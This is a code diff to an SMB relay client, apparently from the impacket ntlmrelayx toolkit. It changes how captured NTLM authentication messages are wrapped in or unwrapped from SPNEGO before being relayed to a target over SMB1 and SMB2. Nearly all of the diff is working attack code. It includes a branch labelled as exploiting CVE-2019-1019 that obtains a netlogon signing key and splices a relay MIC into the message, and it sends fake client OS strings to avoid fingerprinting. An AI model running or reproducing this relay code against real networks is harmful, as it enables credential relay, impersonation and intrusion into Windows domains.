@@ -145,9 +145,9 @@ class SMBRelayClient(ProtocolClient):
         # Here we will use netlogon to get the signing session key
         logging.info("Connecting to %s NETLOGON service" % self.serverConfig.domainIp)
 
-        respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
+        #respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
         authenticateMessage = NTLMAuthChallengeResponse()
-        authenticateMessage.fromString(respToken2['ResponseToken'])
+        authenticateMessage.fromString(authenticateMessageBlob)
         _, machineAccount = self.serverConfig.machineAccount.split('/')
         domainName = authenticateMessage['domain_name'].decode('utf-16le')
 
@@ -342,15 +342,8 @@ class SMBRelayClient(ProtocolClient):
         sessionSetup = SMB2SessionSetup()
         sessionSetup['Flags'] = 0
 
-        # Let's build a NegTokenInit with the NTLMSSP
-        blob = SPNEGO_NegTokenInit()
-
-        # NTLMSSP
-        blob['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
-        blob['MechToken'] = negotiateMessage
-
-        sessionSetup['SecurityBufferLength'] = len(blob)
-        sessionSetup['Buffer'] = blob.getData()
+        sessionSetup['SecurityBufferLength'] = len(negotiateMessage)
+        sessionSetup['Buffer'] = negotiateMessage
 
         packet = v2client.SMB_PACKET()
         packet['Command'] = SMB2_SESSION_SETUP
@@ -361,8 +354,7 @@ class SMBRelayClient(ProtocolClient):
         if ans.isValidAnswer(STATUS_MORE_PROCESSING_REQUIRED):
             v2client._Session['SessionID'] = ans['SessionID']
             sessionSetupResponse = SMB2SessionSetup_Response(ans['Data'])
-            respToken = SPNEGO_NegTokenResp(sessionSetupResponse['Buffer'])
-            return respToken['ResponseToken']
+            return sessionSetupResponse['Buffer']
 
         return False
 
@@ -393,15 +385,17 @@ class SMBRelayClient(ProtocolClient):
         # Let's build a NegTokenInit with the NTLMSSP
         # TODO: In the future we should be able to choose different providers
 
-        blob = SPNEGO_NegTokenInit()
+        #blob = SPNEGO_NegTokenInit()
 
         # NTLMSSP
-        blob['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
-        blob['MechToken'] = negotiateMessage
+        #blob['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
+        #blob['MechToken'] = negotiateMessage
 
-        sessionSetup['Parameters']['SecurityBlobLength']  = len(blob)
+        #sessionSetup['Parameters']['SecurityBlobLength']  = len(blob)
+        sessionSetup['Parameters']['SecurityBlobLength']  = len(negotiateMessage)
         sessionSetup['Parameters'].getData()
-        sessionSetup['Data']['SecurityBlob']       = blob.getData()
+        #sessionSetup['Data']['SecurityBlob'] = blob.getData()
+        sessionSetup['Data']['SecurityBlob'] = negotiateMessage
 
         # Fake Data here, don't want to get us fingerprinted
         sessionSetup['Data']['NativeOS']      = 'Unix'
@@ -426,9 +420,10 @@ class SMBRelayClient(ProtocolClient):
             sessionData       = SMBSessionSetupAndX_Extended_Response_Data(flags = smb['Flags2'])
             sessionData['SecurityBlobLength'] = sessionParameters['SecurityBlobLength']
             sessionData.fromString(sessionResponse['Data'])
-            respToken = SPNEGO_NegTokenResp(sessionData['SecurityBlob'])
+            #respToken = SPNEGO_NegTokenResp(sessionData['SecurityBlob'])
 
-            return respToken['ResponseToken']
+            #return respToken['ResponseToken']
+            return sessionData['SecurityBlob']
 
     def sendStandardSecurityAuth(self, sessionSetupData):
         v1client = self.session.getSMBServer()
@@ -495,20 +490,19 @@ class SMBRelayClient(ProtocolClient):
             authMessage['VersionLen'] = 0
             authenticateMessageBlob = authMessage.getData()
 
-        if unpack('B', authenticateMessageBlob[:1])[0] != SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
-            # We need to wrap the NTLMSSP into SPNEGO
-            respToken2 = SPNEGO_NegTokenResp()
-            respToken2['ResponseToken'] = authenticateMessageBlob
-            authData = respToken2.getData()
-        else:
-            authData = authenticateMessageBlob
+        #if unpack('B', str(authenticateMessageBlob)[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
+        #    # We need to unwrap SPNEGO and get the NTLMSSP
+        #    respToken = SPNEGO_NegTokenResp(authenticateMessageBlob)
+        #    authData = respToken['ResponseToken']
+        #else:
+        authData = authenticateMessageBlob
 
         signingKey = None
         if self.serverConfig.remove_target:
             # Trying to exploit CVE-2019-1019
             # Discovery and Implementation by @simakov_marina and @YaronZi
-            respToken2 = SPNEGO_NegTokenResp(authData)
-            authenticateMessageBlob = respToken2['ResponseToken']
+            # respToken2 = SPNEGO_NegTokenResp(authData)
+            authenticateMessageBlob = authData
 
             errorCode, signingKey = self.netlogonSessionKey(authData)
 
@@ -521,7 +515,8 @@ class SMBRelayClient(ProtocolClient):
 
             respToken2 = SPNEGO_NegTokenResp()
             respToken2['ResponseToken'] = authenticateMessageBlob[0:0x48] + relay_MIC + authenticateMessageBlob[0x58:]
-            authData = respToken2.getData()
+            authData = authenticateMessageBlob[0:0x48] + relay_MIC + authenticateMessageBlob[0x58:]
+            #authData = respToken2.getData()
 
         if self.session.getDialect() == SMB_DIALECT:
             token, errorCode = self.sendAuthv1(authData, serverChallenge)
@@ -535,6 +530,13 @@ class SMBRelayClient(ProtocolClient):
         return token, errorCode
 
     def sendAuthv2(self, authenticateMessageBlob, serverChallenge=None):
+        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
+            # We need to unwrap SPNEGO and get the NTLMSSP
+            respToken = SPNEGO_NegTokenResp(authenticateMessageBlob)
+            authData = respToken['ResponseToken']
+        else:
+            authData = authenticateMessageBlob
+
         v2client = self.session.getSMBServer()
 
         sessionSetup = SMB2SessionSetup()
@@ -545,8 +547,8 @@ class SMBRelayClient(ProtocolClient):
         packet['Data']    = sessionSetup
 
         # Reusing the previous structure
-        sessionSetup['SecurityBufferLength'] = len(authenticateMessageBlob)
-        sessionSetup['Buffer'] = authenticateMessageBlob
+        sessionSetup['SecurityBufferLength'] = len(authData)
+        sessionSetup['Buffer'] = authData
 
         packetID = v2client.sendSMB(packet)
         packet = v2client.recvSMB(packetID)
@@ -554,11 +556,18 @@ class SMBRelayClient(ProtocolClient):
         return packet, packet['Status']
 
     def sendAuthv1(self, authenticateMessageBlob, serverChallenge=None):
+        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
+            # We need to unwrap SPNEGO and get the NTLMSSP
+            respToken = SPNEGO_NegTokenResp(authenticateMessageBlob)
+            authData = respToken['ResponseToken']
+        else:
+            authData = authenticateMessageBlob
+
         v1client = self.session.getSMBServer()
 
         smb = NewSMBPacket()
         smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
-        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY
+        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY | SMB.FLAGS2_UNICODE
         # Are we required to sign SMB? If so we do it, if not we skip it
         if v1client.is_signing_required():
            smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE
@@ -578,8 +587,8 @@ class SMBRelayClient(ProtocolClient):
         sessionSetup['Data']['NativeOS']      = 'Unix'
         sessionSetup['Data']['NativeLanMan']  = 'Samba'
 
-        sessionSetup['Parameters']['SecurityBlobLength'] = len(authenticateMessageBlob)
-        sessionSetup['Data']['SecurityBlob'] = authenticateMessageBlob
+        sessionSetup['Parameters']['SecurityBlobLength'] = len(authData)
+        sessionSetup['Data']['SecurityBlob'] = authData
         smb.addCommand(sessionSetup)
         v1client.sendSMB(smb)
 
